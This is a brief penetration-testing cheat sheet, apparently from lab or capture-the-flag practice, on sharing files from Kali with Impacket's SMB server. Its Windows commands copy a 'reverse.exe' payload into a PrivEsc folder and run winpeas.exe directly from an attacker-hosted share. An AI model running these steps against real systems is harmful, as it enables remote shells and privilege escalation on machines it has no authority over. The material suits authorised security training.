## Setup a Impacket share folder (no authentication) 
### On Kali
```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

### On Windows 
```powershell
copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
net use Z: \\10.10.10.10\kali\ 
```

## Setup a Impacket share folder (authentication needed) 
### On Kali
```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali -smb2support -username kali -password kali .
```

### On Windows
```powershell
net use Z: \\10.10.14.4\kali /user:kali kali
\\10.10.14.4\kali\winpeas.exe /user:kali kali
```